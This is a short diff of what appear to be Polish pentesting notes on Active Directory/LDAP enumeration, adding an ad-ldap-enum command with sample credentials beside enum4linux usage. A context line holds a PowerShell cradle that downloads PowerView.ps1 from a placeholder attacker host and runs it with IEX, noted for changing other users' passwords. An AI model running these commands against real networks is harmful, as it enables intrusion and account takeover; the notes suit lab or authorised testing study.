@@ -1,6 +1,9 @@
 enumeracja AD/LDAP
 enum4linux 10.10.11.35
 
+https://github.com/CroweCybersecurity/ad-ldap-enum
+python 'ad-ldap-enum.py' -d contoso.com -l 10.0.0.1 -u 'Administrator' -p 'P@ssw0rd' -o 'ad-ldap-enum_2' --verbosity BASIC -lf 'ad-ldap-enum_Log.txt'
+
 
 powerview.ps1 -> zmiana hasla innego usera + wiele innych
 (New-Object System.Net.WebClient).DownloadString('http://YOUR_IP/PowerView.ps1') | IEX
